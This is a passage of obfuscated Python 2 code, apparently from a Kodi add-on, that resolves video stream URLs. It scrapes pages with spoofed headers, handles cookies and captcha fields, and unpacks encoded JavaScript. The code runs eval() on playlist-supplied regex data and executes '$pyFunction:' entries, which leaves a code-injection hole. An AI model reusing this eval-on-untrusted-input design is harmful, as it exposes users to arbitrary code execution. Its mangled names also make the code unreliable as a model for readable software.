    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'expre' ] = O0i1II1Iiii1I11 ( 'expres' ) [ 0 ] . string
    if not O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'expre' ] :
     O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'expre' ] = ''
   except :
    III1ii1iII ( "Regex: -- No Referer --" )
   O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'page' ] = O0i1II1Iiii1I11 ( 'page' ) [ 0 ] . string
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'refer' ] = O0i1II1Iiii1I11 ( 'referer' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No Referer --" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'connection' ] = O0i1II1Iiii1I11 ( 'connection' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No connection --" )
    if 88 - 88: i11iIiiIii - i11Ii11I1Ii1i
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'notplayable' ] = O0i1II1Iiii1I11 ( 'notplayable' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No notplayable --" )
    if 67 - 67: iii1I1I . oOo0O0Ooo + oO0o - OoooooooOO
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'noredirect' ] = O0i1II1Iiii1I11 ( 'noredirect' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No noredirect --" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'origin' ] = O0i1II1Iiii1I11 ( 'origin' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No origin --" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'includeheaders' ] = O0i1II1Iiii1I11 ( 'includeheaders' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No includeheaders --" )
    if 70 - 70: iii1I1I / oO0OooOoO - iIii1I11I1II1 - Oo0ooO0oo0oO
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'x-req' ] = O0i1II1Iiii1I11 ( 'x-req' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No x-req --" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'x-forward' ] = O0i1II1Iiii1I11 ( 'x-forward' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No x-forward --" )
    if 11 - 11: iIii1I11I1II1 . OoooooooOO . oO0OooOoO / i1IIi - O00oOoOoO0o0O
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'agent' ] = O0i1II1Iiii1I11 ( 'agent' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- No User Agent --" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'post' ] = O0i1II1Iiii1I11 ( 'post' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a post" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'rawpost' ] = O0i1II1Iiii1I11 ( 'rawpost' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a rawpost" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'htmlunescape' ] = O0i1II1Iiii1I11 ( 'htmlunescape' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a htmlunescape" )
    if 30 - 30: oO0o
    if 21 - 21: i11iIiiIii / II % iii1I1I * O0 . O00oOoOoO0o0O - iIii1I11I1II1
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'readcookieonly' ] = O0i1II1Iiii1I11 ( 'readcookieonly' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a readCookieOnly" )
    if 26 - 26: oO0OooOoO * oO0o
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] = O0i1II1Iiii1I11 ( 'cookiejar' ) [ 0 ] . string
    if not O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] :
     O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'cookiejar' ] = ''
   except :
    III1ii1iII ( "Regex: -- Not a cookieJar" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'setcookie' ] = O0i1II1Iiii1I11 ( 'setcookie' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a setcookie" )
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'appendcookie' ] = O0i1II1Iiii1I11 ( 'appendcookie' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- Not a appendcookie" )
    if 10 - 10: oO0OooOoO . Oo0ooO0oo0oO
   try :
    O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] [ 'ignorecache' ] = O0i1II1Iiii1I11 ( 'ignorecache' ) [ 0 ] . string
   except :
    III1ii1iII ( "Regex: -- no ignorecache" )
    if 32 - 32: O0oo0OO0 . I1i1iI1i . OoooooooOO - I1ii11iIi11i + Ii1I
    if 88 - 88: Oo0ooO0oo0oO
    if 19 - 19: oO0OooOoO * I1i1iI1i + O0oo0OO0
    if 65 - 65: iii1I1I . II . I1ii11iIi11i . Oo0ooO0oo0oO - iii1I1I
    if 19 - 19: i11iIiiIii + Oo0ooO0oo0oO % i11Ii11I1Ii1i
  O0o = urllib . quote ( repr ( O0o ) )
  return O0o
  if 14 - 14: I1ii11iIi11i . oO0OooOoO . O00oOoOoO0o0O / O0oo0OO0 % I11i - i11Ii11I1Ii1i
 except :
  O0o = None
  III1ii1iII ( 'regex Error: ' + iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) )
  if 67 - 67: O00oOoOoO0o0O - iii1I1I . i1IIi
def I1I1iI ( url ) :
 try :
  for O0i1II1Iiii1I11 in range ( 1 , 51 ) :
   IIIII = I1iIi1iiIIiI ( url )
   if "EXT-X-STREAM-INF" in IIIII : return url
   if not "EXTM3U" in IIIII : return
   xbmc . sleep ( 2000 )
  return
 except :
  return
  if 81 - 81: I1ii11iIi11i * oO0o . iii1I1I
  if 11 - 11: i11iIiiIii - Ii1I . Ii1I
def I11I ( regexs , url , cookieJar = None , forCookieJarOnly = False , recursiveCall = False , cachedPages = { } , rawPost = False , cookie_jar_file = None ) :
 if not recursiveCall :
  regexs = eval ( urllib . unquote ( regexs ) )
  if 6 - 6: I11i + Ii1I
 Ii1iI11iI1 = re . compile ( '\$doregex\[([^\]]*)\]' ) . findall ( url )
 if 5 - 5: iIii1I11I1II1
 OOo = True
 if 94 - 94: O0oo0OO0 + iIii1I11I1II1 % I1ii11iIi11i
 if 93 - 93: O0oo0OO0 - iii1I1I + iIii1I11I1II1 * OOooOOo + II . Oo0ooO0oo0oO
 if 49 - 49: OoooooooOO * O00oOoOoO0o0O - oOo0O0Ooo . Ii1I
 if 89 - 89: i11Ii11I1Ii1i + O0oo0OO0 * i11Ii11I1Ii1i / i11Ii11I1Ii1i
 for i11i11 in Ii1iI11iI1 :
  if i11i11 in regexs :
   if 72 - 72: i1IIi - oO0OooOoO - iii1I1I + iii1I1I * OOooOOo * iii1I1I
   iII1I1 = regexs [ i11i11 ]
   if 85 - 85: Oo0ooO0oo0oO * OOooOOo
   ii1iii11i1 = False
   if 4 - 4: I1i1iI1i . I1i1iI1i % I11i % O0oo0OO0 / O0oo0OO0
   if 29 - 29: oOo0O0Ooo * i11Ii11I1Ii1i * I11i / i11iIiiIii
   if 'cookiejar' in iII1I1 :
    if 26 - 26: I1i1iI1i % II % Ii1I % O0oo0OO0
    ii1iii11i1 = iII1I1 [ 'cookiejar' ]
    if '$doregex' in ii1iii11i1 :
     cookieJar = I11I ( regexs , iII1I1 [ 'cookiejar' ] , cookieJar , True , True , cachedPages )
     ii1iii11i1 = True
    else :
     ii1iii11i1 = True
     if 55 - 55: i11Ii11I1Ii1i % OoooooooOO / OoooooooOO % OoooooooOO
   if ii1iii11i1 :
    if cookieJar == None :
     if 52 - 52: I11i + I11i . oO0OooOoO
     cookie_jar_file = None
     if 'open[' in iII1I1 [ 'cookiejar' ] :
      cookie_jar_file = iII1I1 [ 'cookiejar' ] . split ( 'open[' ) [ 1 ] . split ( ']' ) [ 0 ]
      if 34 - 34: OoooooooOO . O0 / Ii1I * oO0o - I11i
     cookieJar = IiiiI ( cookie_jar_file )
     if cookie_jar_file :
      Iiii1I1 ( cookieJar , cookie_jar_file )
      if 83 - 83: iii1I1I . II + Ii1I - iii1I1I * II / II
      if 39 - 39: II / oOo0O0Ooo % I1ii11iIi11i % i11iIiiIii
      if 90 - 90: II - OoooooooOO
    elif 'save[' in iII1I1 [ 'cookiejar' ] :
     cookie_jar_file = iII1I1 [ 'cookiejar' ] . split ( 'save[' ) [ 1 ] . split ( ']' ) [ 0 ]
     OoOOoO000O00oO = os . path . join ( i11 , cookie_jar_file )
     print 'complete_path' , OoOOoO000O00oO
     Iiii1I1 ( cookieJar , cookie_jar_file )
     if 34 - 34: O0
     if 80 - 80: i1IIi - oOo0O0Ooo / I1ii11iIi11i - i11iIiiIii
   if iII1I1 [ 'page' ] and '$doregex' in iII1I1 [ 'page' ] :
    iII1I1 [ 'page' ] = I11I ( regexs , iII1I1 [ 'page' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    if 68 - 68: Ii1I - I11i % O0 % II
   if 'setcookie' in iII1I1 and iII1I1 [ 'setcookie' ] and '$doregex' in iII1I1 [ 'setcookie' ] :
    iII1I1 [ 'setcookie' ] = I11I ( regexs , iII1I1 [ 'setcookie' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
   if 'appendcookie' in iII1I1 and iII1I1 [ 'appendcookie' ] and '$doregex' in iII1I1 [ 'appendcookie' ] :
    iII1I1 [ 'appendcookie' ] = I11I ( regexs , iII1I1 [ 'appendcookie' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    if 11 - 11: O0 / I1ii11iIi11i % iii1I1I + OOooOOo + iIii1I11I1II1
    if 40 - 40: i11Ii11I1Ii1i - iii1I1I . O0oo0OO0 * oOo0O0Ooo % II
   if 'post' in iII1I1 and '$doregex' in iII1I1 [ 'post' ] :
    iII1I1 [ 'post' ] = I11I ( regexs , iII1I1 [ 'post' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    print 'post is now' , iII1I1 [ 'post' ]
    if 56 - 56: i11iIiiIii . OOooOOo - o0Oo * O00oOoOoO0o0O
   if 'rawpost' in iII1I1 and '$doregex' in iII1I1 [ 'rawpost' ] :
    iII1I1 [ 'rawpost' ] = I11I ( regexs , iII1I1 [ 'rawpost' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages , rawPost = True )
    if 91 - 91: Ii1I + OoooooooOO - i1IIi
    if 84 - 84: O0oo0OO0 / I1i1iI1i
   if 'rawpost' in iII1I1 and '$epoctime$' in iII1I1 [ 'rawpost' ] :
    iII1I1 [ 'rawpost' ] = iII1I1 [ 'rawpost' ] . replace ( '$epoctime$' , OOOooo0OooOoO ( ) )
    if 91 - 91: Ii1I + o0Oo
   if 'rawpost' in iII1I1 and '$epoctime2$' in iII1I1 [ 'rawpost' ] :
    iII1I1 [ 'rawpost' ] = iII1I1 [ 'rawpost' ] . replace ( '$epoctime2$' , OoOooo ( ) )
    if 74 - 74: iIii1I11I1II1 * I1i1iI1i % oO0o
    if 36 - 36: OoooooooOO - Ii1I
   OOooo = ''
   if iII1I1 [ 'page' ] and iII1I1 [ 'page' ] in cachedPages and not 'ignorecache' in iII1I1 and forCookieJarOnly == False :
    OOooo = cachedPages [ iII1I1 [ 'page' ] ]
   else :
    if iII1I1 [ 'page' ] and not iII1I1 [ 'page' ] == '' and iII1I1 [ 'page' ] . startswith ( 'http' ) :
     if '$epoctime$' in iII1I1 [ 'page' ] :
      iII1I1 [ 'page' ] = iII1I1 [ 'page' ] . replace ( '$epoctime$' , OOOooo0OooOoO ( ) )
     if '$epoctime2$' in iII1I1 [ 'page' ] :
      iII1I1 [ 'page' ] = iII1I1 [ 'page' ] . replace ( '$epoctime2$' , OoOooo ( ) )
      if 51 - 51: I11i
      if 41 - 41: I11i * i11Ii11I1Ii1i - O0oo0OO0 + oOo0O0Ooo
     IiIIIII11I = iII1I1 [ 'page' ] . split ( '|' )
     Ii1I11I = IiIIIII11I [ 0 ]
     iiIii1I = None
     if len ( IiIIIII11I ) > 1 :
      iiIii1I = IiIIIII11I [ 1 ]
     o00oOO0 = urllib2 . Request ( Ii1I11I )
     o00oOO0 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1' )
     if 'refer' in iII1I1 :
      o00oOO0 . add_header ( 'Referer' , iII1I1 [ 'refer' ] )
     if 'agent' in iII1I1 :
      o00oOO0 . add_header ( 'User-agent' , iII1I1 [ 'agent' ] )
     if 'x-req' in iII1I1 :
      o00oOO0 . add_header ( 'X-Requested-With' , iII1I1 [ 'x-req' ] )
     if 'x-forward' in iII1I1 :
      o00oOO0 . add_header ( 'X-Forwarded-For' , iII1I1 [ 'x-forward' ] )
     if 'setcookie' in iII1I1 :
      print 'adding cookie' , iII1I1 [ 'setcookie' ]
      o00oOO0 . add_header ( 'Cookie' , iII1I1 [ 'setcookie' ] )
     if 'appendcookie' in iII1I1 :
      print 'appending cookie to cookiejar' , iII1I1 [ 'appendcookie' ]
      i1I11iIiII = iII1I1 [ 'appendcookie' ]
      i1I11iIiII = i1I11iIiII . split ( ';' )
      for OO0OO0OO in i1I11iIiII :
       Ooo , oO0oIIIii1iiIi = OO0OO0OO . split ( '=' )
       oooo0OOo , Ooo = Ooo . split ( ':' )
       OoO00 = cookielib . Cookie ( version = 0 , name = Ooo , value = oO0oIIIii1iiIi , port = None , port_specified = False , domain = oooo0OOo , domain_specified = False , domain_initial_dot = False , path = '/' , path_specified = True , secure = False , expires = None , discard = True , comment = None , comment_url = None , rest = { 'HttpOnly' : None } , rfc2109 = False )
       cookieJar . set_cookie ( OoO00 )
       if 18 - 18: O0oo0OO0 - OoooooooOO % oO0OooOoO - o0Oo % oO0o
       if 60 - 60: iIii1I11I1II1 + i1IIi
       if 86 - 86: iIii1I11I1II1 + oO0o . i11iIiiIii - O0oo0OO0
       if 51 - 51: oO0o
     if 'origin' in iII1I1 :
      o00oOO0 . add_header ( 'Origin' , iII1I1 [ 'origin' ] )
     if iiIii1I :
      iiIii1I = iiIii1I . split ( '&' )
      for OO0OO0OO in iiIii1I :
       Ooo , oO0oIIIii1iiIi = OO0OO0OO . split ( '=' )
       o00oOO0 . add_header ( Ooo , oO0oIIIii1iiIi )
       if 14 - 14: I1i1iI1i % Ii1I % oOo0O0Ooo - i11iIiiIii
       if 53 - 53: O0oo0OO0 % oOo0O0Ooo
     if not cookieJar == None :
      if 59 - 59: iii1I1I % iIii1I11I1II1 . i1IIi + oO0OooOoO * I1i1iI1i
      i1IiiI1iIi = urllib2 . HTTPCookieProcessor ( cookieJar )
      oOOo00O0OOOo = urllib2 . build_opener ( i1IiiI1iIi , urllib2 . HTTPBasicAuthHandler ( ) , urllib2 . HTTPHandler ( ) )
      oOOo00O0OOOo = urllib2 . install_opener ( oOOo00O0OOOo )
      if 'noredirect' in iII1I1 :
       i11I1I1iiI = urllib2 . build_opener ( IiiIII111iI )
       oOOo00O0OOOo = urllib2 . install_opener ( i11I1I1iiI )
       if 34 - 34: O00oOoOoO0o0O % i11Ii11I1Ii1i . O0 . iIii1I11I1II1
     if 'connection' in iII1I1 :
      print '..........................connection//////.' , iII1I1 [ 'connection' ]
      from keepalive import HTTPHandler
      ooi1II1I = HTTPHandler ( )
      oOOo00O0OOOo = urllib2 . build_opener ( ooi1II1I )
      urllib2 . install_opener ( oOOo00O0OOOo )
      if 95 - 95: I1ii11iIi11i - iii1I1I / oO0OooOoO % I11i . OOooOOo
      if 24 - 24: i1IIi . i11iIiiIii
     IIIII1iii11 = None
     if 35 - 35: Ii1I / II / oO0OooOoO - iIii1I11I1II1 + oO0OooOoO . II
     if 'post' in iII1I1 :
      O0O00O000OOO = iII1I1 [ 'post' ]
      if '$LiveStreamRecaptcha' in O0O00O000OOO :
       ( iIOo0O , Ii11 ) = II1i111 ( iII1I1 [ 'page' ] )
       if iIOo0O :
        O0O00O000OOO += 'recaptcha_challenge_field:' + iIOo0O + ',recaptcha_response_field:' + Ii11
      i1iiiIii11 = O0O00O000OOO . split ( ',' ) ;
      IIIII1iii11 = { }
      for OOoOOO000O0 in i1iiiIii11 :
       Ooo = OOoOOO000O0 . split ( ':' ) [ 0 ] ;
       oO0oIIIii1iiIi = OOoOOO000O0 . split ( ':' ) [ 1 ] ;
       IIIII1iii11 [ Ooo ] = oO0oIIIii1iiIi
      IIIII1iii11 = urllib . urlencode ( IIIII1iii11 )
      if 92 - 92: I11i / O0
     if 'rawpost' in iII1I1 :
      IIIII1iii11 = iII1I1 [ 'rawpost' ]
      if '$LiveStreamRecaptcha' in IIIII1iii11 :
       ( iIOo0O , Ii11 ) = II1i111 ( iII1I1 [ 'page' ] )
       if iIOo0O :
        IIIII1iii11 += '&recaptcha_challenge_field=' + iIOo0O + '&recaptcha_response_field=' + Ii11
        if 80 - 80: OOooOOo - iii1I1I + OoooooooOO
        if 98 - 98: iii1I1I + i1IIi . o0Oo - oO0OooOoO - OOooOOo
        if 24 - 24: oOo0O0Ooo - i1IIi + O00oOoOoO0o0O
        if 38 - 38: OoooooooOO / I11i . O0 / i1IIi / oOo0O0Ooo + iIii1I11I1II1
     if IIIII1iii11 :
      oOoo = urllib2 . urlopen ( o00oOO0 , IIIII1iii11 )
     else :
      oOoo = urllib2 . urlopen ( o00oOO0 )
      if 96 - 96: Oo0ooO0oo0oO
     OOooo = oOoo . read ( )
     OOooo = i1I11iIII1i1I ( OOooo )
     if 63 - 63: oOo0O0Ooo + II - oO0OooOoO
     if 'includeheaders' in iII1I1 :
      OOooo += str ( oOoo . headers . get ( 'Set-Cookie' ) )
      if 2 - 2: I1i1iI1i
     oOoo . close ( )
     cachedPages [ iII1I1 [ 'page' ] ] = OOooo
     if 97 - 97: Ii1I - OoooooooOO
     if 79 - 79: oO0o % I1i1iI1i % oOo0O0Ooo
     if 29 - 29: OoooooooOO . o0Oo % I11i - Oo0ooO0oo0oO
     if forCookieJarOnly :
      return cookieJar
    elif iII1I1 [ 'page' ] and not iII1I1 [ 'page' ] . startswith ( 'http' ) :
     if iII1I1 [ 'page' ] . startswith ( '$pyFunction:' ) :
      iiii = o0OO0Oo ( iII1I1 [ 'page' ] . split ( '$pyFunction:' ) [ 1 ] , '' , cookieJar )
      if forCookieJarOnly :
       return cookieJar
      OOooo = iiii
     else :
      OOooo = iII1I1 [ 'page' ]
   if '$pyFunction:playmedia(' in iII1I1 [ 'expre' ] or 'ActivateWindow' in iII1I1 [ 'expre' ] or any ( x in url for x in IIiIiII11i ) :
    OOo = False
   if '$doregex' in iII1I1 [ 'expre' ] :
    iII1I1 [ 'expre' ] = I11I ( regexs , iII1I1 [ 'expre' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
    if 3 - 3: II - O0 % iIii1I11I1II1 / I1i1iI1i . OOooOOo
    if 3 - 3: O0 % OoooooooOO / iii1I1I
   if not iII1I1 [ 'expre' ] == '' :
    print 'doing it ' , iII1I1 [ 'expre' ]
    if '$LiveStreamCaptcha' in iII1I1 [ 'expre' ] :
     iiii = ooOo ( iII1I1 , OOooo , cookieJar )
     if 84 - 84: iii1I1I
     url = url . replace ( "$doregex[" + i11i11 + "]" , iiii )
    elif iII1I1 [ 'expre' ] . startswith ( '$pyFunction:' ) :
     if 87 - 87: i11Ii11I1Ii1i + OOooOOo
     iiii = o0OO0Oo ( iII1I1 [ 'expre' ] . split ( '$pyFunction:' ) [ 1 ] , OOooo , cookieJar )
     if 'ActivateWindow' in iII1I1 [ 'expre' ] : return
     print 'still hre'
     print 'url k val' , url , i11i11 , iiii
     if 28 - 28: iii1I1I * I11i / Ii1I
     url = url . replace ( "$doregex[" + i11i11 + "]" , iiii )
    else :
     if not OOooo == '' :
      OOoOO0OO = re . compile ( iII1I1 [ 'expre' ] ) . search ( OOooo )
      iiii = ''
      try :
       iiii = OOoOO0OO . group ( 1 ) . strip ( )
      except : traceback . print_exc ( )
     else :
      iiii = iII1I1 [ 'expre' ]
     if rawPost :
      print 'rawpost'
      iiii = urllib . quote_plus ( iiii )
     if 'htmlunescape' in iII1I1 :
      if 26 - 26: Oo0ooO0oo0oO . Oo0ooO0oo0oO
      import HTMLParser
      iiii = HTMLParser . HTMLParser ( ) . unescape ( iiii )
     url = url . replace ( "$doregex[" + i11i11 + "]" , iiii )
     if 35 - 35: II . oO0o * i11iIiiIii
   else :
    url = url . replace ( "$doregex[" + i11i11 + "]" , '' )
 if '$epoctime$' in url :
  url = url . replace ( '$epoctime$' , OOOooo0OooOoO ( ) )
 if '$epoctime2$' in url :
  url = url . replace ( '$epoctime2$' , OoOooo ( ) )
  if 44 - 44: i11iIiiIii / oOo0O0Ooo
 if '$GUID$' in url :
  import uuid
  url = url . replace ( '$GUID$' , str ( uuid . uuid1 ( ) ) . upper ( ) )
 if '$get_cookies$' in url :
  url = url . replace ( '$get_cookies$' , Ii1IIi ( cookieJar ) )
  if 43 - 43: II % Oo0ooO0oo0oO
 if recursiveCall : return url
 print 'final url' , url
 if url == "" :
  return
 else :
  return url , OOo
  if 69 - 69: Oo0ooO0oo0oO % I1ii11iIi11i
  if 86 - 86: Ii1I / Ii1I
  if 28 - 28: i11iIiiIii / OOooOOo . iIii1I11I1II1 / oO0OooOoO
def OoOO ( t ) :
 import hashlib
 OO0OO0OO = hashlib . md5 ( )
 OO0OO0OO . update ( t )
 return OO0OO0OO . hexdigest ( )
 if 32 - 32: oO0o * o0Oo % i11Ii11I1Ii1i * O0oo0OO0 . O0
def i11i1i1I1iI1 ( encrypted ) :
 O0ooOo0 = ""
 for iiii in encrypted . split ( ':' ) :
  O0ooOo0 += chr ( int ( iiii . replace ( "0m0" , "" ) ) / 84 / 5 )
 return O0ooOo0
 if 53 - 53: OoooooooOO - I1i1iI1i
def oOo ( media_url ) :
 try :
  import CustomPlayer
  i1iIIIiiiI = CustomPlayer . MyXBMCPlayer ( )
  OoO00oo00 = xbmcgui . ListItem ( label = str ( iI1i11iII111 ) , iconImage = "DefaultVideo.png" , thumbnailImage = xbmc . getInfoImage ( "ListItem.Thumb" ) , path = media_url )
  i1iIIIiiiI . play ( media_url , OoO00oo00 )
  xbmc . sleep ( 1000 )
  while i1iIIIiiiI . is_active :
   xbmc . sleep ( 200 )
 except :
  traceback . print_exc ( )
 return ''
 if 76 - 76: OoooooooOO + oOo0O0Ooo % I1i1iI1i . I1ii11iIi11i + oO0OooOoO
 if 70 - 70: o0Oo / O00oOoOoO0o0O
def IIiiiiIiIIii ( page_value , referer = None ) :
 if referer :
  referer = [ ( 'Referer' , referer ) ]
 if page_value . startswith ( "http" ) :
  O0OO = page_value
  page_value = I1iIi1iiIIiI ( page_value , headers = referer )
  if 39 - 39: I11i + o0Oo - iIii1I11I1II1 - OOooOOo
 I1i = "(eval\(function\(p,a,c,k,e,(?:r|d).*)"
 if 49 - 49: I11i
 O0oOOo0o = re . compile ( I1i ) . findall ( page_value )
 I1iii11 = ""
 if O0oOOo0o and len ( O0oOOo0o ) > 0 :
  for oO0oIIIii1iiIi in O0oOOo0o :
   I1III11iiii11i1 = ooOo0OoO ( oO0oIIIii1iiIi )
   i1iiIIi1I = II1iIi11 ( I1III11iiii11i1 , '\'(.*?)\'' )
   if 'unescape' in I1III11iiii11i1 :
    I1III11iiii11i1 = urllib . unquote ( i1iiIIi1I )
   I1iii11 += I1III11iiii11i1 + '\n'
  print 'final value is ' , I1iii11
  if 36 - 36: o0Oo * oOo0O0Ooo
  O0OO = II1iIi11 ( I1iii11 , 'src="(.*?)"' )
  if 77 - 77: Ii1I % i1IIi - O0oo0OO0
  page_value = I1iIi1iiIIiI ( O0OO , headers = referer )
  if 93 - 93: I1ii11iIi11i * oOo0O0Ooo
  if 73 - 73: OOooOOo - o0Oo * i1IIi / i11iIiiIii * iii1I1I % oO0OooOoO
  if 56 - 56: OoooooooOO * oOo0O0Ooo . oOo0O0Ooo . I11i
 II1Oo00O0Oo0Oo = II1iIi11 ( page_value , 'streamer\'.*?\'(.*?)\'\)' )
 I1I11i = II1iIi11 ( page_value , 'file\',\s\'(.*?)\'' )
 if 66 - 66: O0oo0OO0 . o0Oo + OOooOOo . iIii1I11I1II1
 if 51 - 51: O00oOoOoO0o0O . oOo0O0Ooo
 return II1Oo00O0Oo0Oo + ' playpath=' + I1I11i + ' pageUrl=' + O0OO
 if 45 - 45: i1IIi - oOo0O0Ooo / O0 . I11i
def iI1 ( page_value , referer = None ) :
 if referer :
  referer = [ ( 'Referer' , referer ) ]
 if page_value . startswith ( "http" ) :
  page_value = I1iIi1iiIIiI ( page_value , headers = referer )
 I1i = "var a = (.*?);\s*var b = (.*?);\s*var c = (.*?);\s*var d = (.*?);\s*var f = (.*?);\s*var v_part = '(.*?)';"
 O0oOOo0o = re . compile ( I1i ) . findall ( page_value ) [ 0 ]
 if 14 - 14: I11i
 Iiii1iI1i , i1I1I , iiI , O0ooo0O0oo0 , oO00o0 , oO0oIIIii1iiIi = ( O0oOOo0o )
 oO00o0 = int ( oO00o0 )
 Iiii1iI1i = int ( Iiii1iI1i ) / oO00o0
 i1I1I = int ( i1I1I ) / oO00o0
 iiI = int ( iiI ) / oO00o0
 O0ooo0O0oo0 = int ( O0ooo0O0oo0 ) / oO00o0
 if 49 - 49: Ii1I / i1IIi % O0oo0OO0 . o0Oo
 oOOoOoo0O0 = 'rtmp://' + str ( Iiii1iI1i ) + '.' + str ( i1I1I ) + '.' + str ( iiI ) + '.' + str ( O0ooo0O0oo0 ) + oO0oIIIii1iiIi ;
 return oOOoOoo0O0
 if 45 - 45: i11iIiiIii
def o00oo0 ( url , useragent = None ) :
 str = '#EXTM3U'
 str += '\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=361816'
 str += '\n' + url + '&bytes=0-200000'
 oooOOOOO = os . path . join ( i11 , 'testfile.m3u' )
 str += '\n'
 Oo0oOooOoOo ( oooOOOOO , str )
 if 49 - 49: iii1I1I . I11i . i11iIiiIii - oO0OooOoO / O0oo0OO0
 return oooOOOOO
 if 62 - 62: iii1I1I
def Oo0oOooOoOo ( file_name , page_data , append = False ) :
 if append :
  oO00o0 = open ( file_name , 'a' )
  oO00o0 . write ( page_data )
  oO00o0 . close ( )
 else :
  oO00o0 = open ( file_name , 'wb' )
  oO00o0 . write ( page_data )
  oO00o0 . close ( )
  return ''
  if 1 - 1: I1i1iI1i / I1i1iI1i - i11iIiiIii
def OO0o ( file_name ) :
 oO00o0 = open ( file_name , 'rb' )
 O0ooo0O0oo0 = oO00o0 . read ( )
 oO00o0 . close ( )
 return O0ooo0O0oo0
 if 32 - 32: OoooooooOO - oO0o - i11iIiiIii * OOooOOo / oOo0O0Ooo + OoooooooOO
def ii1I1I111 ( page_data ) :
 import re , base64 , urllib ;
 Ii1Ii = page_data
 while 'geh(' in Ii1Ii :
  if Ii1Ii . startswith ( 'lol(' ) : Ii1Ii = Ii1Ii [ 5 : - 1 ]
  if 39 - 39: Ii1I - i1IIi / i11Ii11I1Ii1i . o0Oo * i1IIi - iIii1I11I1II1
  Ii1Ii = re . compile ( '"(.*?)"' ) . findall ( Ii1Ii ) [ 0 ] ;
  Ii1Ii = base64 . b64decode ( Ii1Ii ) ;
  Ii1Ii = urllib . unquote ( Ii1Ii ) ;
 return Ii1Ii
 if 55 - 55: o0Oo * OOooOOo % i11Ii11I1Ii1i . iIii1I11I1II1 * II
def o0oo0000 ( page_data ) :
 i111i1i = I1iIi1iiIIiI ( page_data ) ;
 IiIii1I1I = '(http.*)'
 import uuid
 OO0Oooo0oo = str ( uuid . uuid1 ( ) ) . upper ( )
 I1i111IiIiIi1 = re . compile ( IiIii1I1I ) . findall ( i111i1i )
 oo = [ ( 'X-Playback-Session-Id' , OO0Oooo0oo ) ]
 for i1II11II1 in I1i111IiIiIi1 :
  try :
   II1IIIii = I1iIi1iiIIiI ( i1II11II1 , headers = oo ) ;
   if 40 - 40: oO0o % I1ii11iIi11i
  except : pass
  if 62 - 62: OOooOOo
 return page_data + '|&X-Playback-Session-Id=' + OO0Oooo0oo
 if 15 - 15: O00oOoOoO0o0O + O0oo0OO0 . iii1I1I * I1ii11iIi11i . oO0o
 if 18 - 18: i1IIi % oO0OooOoO + II % O0oo0OO0
def oOO ( page_data ) :
 if page_data . startswith ( 'http://dag.total-stream.net' ) :
  oo = [ ( 'User-Agent' , 'Verismo-BlackUI_(2.4.7.5.8.0.34)' ) ]
  page_data = I1iIi1iiIIiI ( page_data , headers = oo ) ;
  if 53 - 53: OOooOOo % oOo0O0Ooo * oOo0O0Ooo
 if '127.0.0.1' in page_data :
  return OOo0o0Oo ( page_data )
 elif II1iIi11 ( page_data , 'wmsAuthSign%3D([^%&]+)' ) != '' :
